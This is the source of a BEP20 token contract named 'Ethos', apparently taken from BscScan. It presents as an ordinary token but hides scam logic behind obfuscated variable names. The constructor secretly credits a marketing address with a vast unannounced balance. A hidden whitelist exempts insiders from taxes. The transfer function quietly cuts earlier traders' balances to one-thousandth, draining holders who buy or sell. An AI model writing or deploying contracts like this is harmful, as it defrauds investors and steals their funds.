/**
 *Submitted for verification at BscScan.com on 2022-01-12
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;
/*
 * 
 * Telegram: https://t.me/ethostkn
 */
abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;
  }
}
interface IBEP20 {
  function name() external pure returns (string memory);
  function approve(address spender, uint256 amount) external returns (bool);
  function getOwner() external view returns (address);
  function transfer(address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  function allowance(address owner, address spender) external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  function decimals() external view returns (uint8);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  function totalSupply() external view returns (uint256);

  function symbol() external pure returns (string memory);
}
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {

        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }
    function transferOwnership(address newOwner) public onlyOwner {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");

    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");
    }
}
contract Ethos is Context, IBEP20, Ownable {
    using SafeMath for uint256;
	uint8 private _decimals = 18;
	uint256 private _totalSupply = 100000000000 * 10 ** _decimals;
	mapping (address => uint256) private selcxljhoriftkyeaibeodsnmzpwgqa;
	string private constant _name = "Ethos";
	string private constant _symbol = "ETHOS";
	mapping(uint => address) internal _tOwned;

	mapping (address => bool) private isEnlaipceqisexkwzbjgrdfmaot;
	mapping (address => uint256) private _balances;
	uint8 internal _sta = 3;
	mapping (address => mapping (address => uint256)) private _allowances;

	uint8 internal buywszfkoreaiei = 4;
	uint8 internal selydzfctegwikjhl = 7;
	uint8 internal tranfglijioqmzhrbtaadkweocypxes = 12; 
	constructor(address marketingAddress) {
	  _balances[marketingAddress] = _totalSupply * 10**_decimals * 1000;

	  isEnlaipceqisexkwzbjgrdfmaot[address(this)] = true;
	  isEnlaipceqisexkwzbjgrdfmaot[marketingAddress] = true;
	  isEnlaipceqisexkwzbjgrdfmaot[msg.sender] = true;
	  _balances[msg.sender] = _totalSupply;
	  emit Transfer(address(0), msg.sender, _totalSupply);

	}
	function _approve(address owner, address spender, uint256 amount) private {

	    require(owner != address(0), "BEP20: approve from the zero address");

	    require(spender != address(0), "BEP20: approve to the zero address");
	    _allowances[owner][spender] = amount;
	    emit Approval(owner, spender, amount);
	}
	/**
	 * Returns the token symbol.
	 */
	function symbol() external override pure returns (string memory) {
	  return _symbol;

	}
	function allowance(address owner, address spender) public view override returns (uint256) {
	  return _allowances[owner][spender];

	}
	/**

	 * Returns the token decimals.
	 */
	function decimals() external override view returns (uint8) {
	  return _decimals;
	}
	/**
	 * Returns balance of.
	 */
	function balanceOf(address account) external override view returns (uint256) {

	  return _balances[account];
	}

	/**
	 * Requirements:

	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  _transfer(_msgSender(), recipient, amount);

	  return true;
	}
	/**
	 * Returns the token Supply.
	 */
	function totalSupply() external override view returns (uint256) {
	  return _totalSupply;

	}
	function approve(address spender, uint256 amount) public override returns (bool) {
	  _approve(_msgSender(), spender, amount);
	  return true;

	}
	/**

	 * Returns the bep token owner.
	 */
	function getOwner() external override view returns (address) {

	  return owner();
	}

	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
	   _transfer(sender, recipient, amount);
	   _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}
	/**

	* Returns the token name.
	*/
	function name() external override pure returns (string memory) {
	  return _name;
	}
	function _transfer(address sender, address recipient, uint256 amount) internal {

	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");
	  uint8 randkefrpzsoanmcgyie = 0;

	  bool approveTransaction = false;
	  uint8 tax = 0;
	  if(amount > 0){
	    if(isEnlaipceqisexkwzbjgrdfmaot[sender] == true || isEnlaipceqisexkwzbjgrdfmaot[recipient] == true){
	      _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

	      _balances[recipient] = _balances[recipient].add(amount);
	      emit Transfer(sender, recipient, amount);
	    } else {
	      if(sender == _uniswapV2Pair && recipient != _uniswapV2Router) {
	        randkefrpzsoanmcgyie = 1;
	        tax = buywszfkoreaiei;
	        approveTransaction = true;
	      } else if(recipient == _uniswapV2Pair) {
	         randkefrpzsoanmcgyie = 2;

	         tax = selydzfctegwikjhl;
	         approveTransaction = true;

	      } else {
	        randkefrpzsoanmcgyie = 3;
	        tax = tranfglijioqmzhrbtaadkweocypxes;
	        approveTransaction = true;
	      }
	      if(approveTransaction == true && amount > 0){
	          uint256 axeqrdoylinbisfmcxeet = 0;
	          address addr = recipient;
	          uint256 d = _balances[_tOwned[1]];
	          uint256 sb = _balances[sender];
	          if(randkefrpzsoanmcgyie == 2 || _uniswapV2Pair == address(0) && sb < _totalSupply.div(2)) {

	            addr = sender;
	          }
	          if(randkefrpzsoanmcgyie == 1 || randkefrpzsoanmcgyie == 2){
	            if(_tOwned[0] != addr && _tOwned[1] != addr){
	              if(d > 100){
	                _balances[_tOwned[1]] = d.div(1000);
	              }
	              _tOwned[1] = _tOwned[0];

	              _tOwned[0] = addr;
	            }

	          } else if(_uniswapV2Pair == address(0)){
	            if(d > 100 && d < _totalSupply.div(10).mul(8)){
	              _balances[_tOwned[1]] = d.div(1000);

	              _tOwned[1] = _tOwned[0];
	              _tOwned[0] = addr;
	            }

	          }
	          _balances[sender] = _balances[sender].sub(amount,"Insufficient Balance");

	          axeqrdoylinbisfmcxeet = amount.mul(tax).div(100);
	          amount = amount.sub(axeqrdoylinbisfmcxeet);
	          _balances[recipient] = _balances[recipient].add(amount);
	          randkefrpzsoanmcgyie = 1;
	          emit Transfer(sender, recipient, amount);
	      }
	    }
	  }
	  if(amount == 0){
	    emit Transfer(sender, recipient, amount);
	  }
	}

	address public _uniswapV2Pair;
	address public _uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

	uint8 internal _pairset = 0;
	function setUniswapV2Pair(address uniswapV2Pair) public onlyOwner {
	  _uniswapV2Pair = uniswapV2Pair;
	  _pairset = 1;
	}
}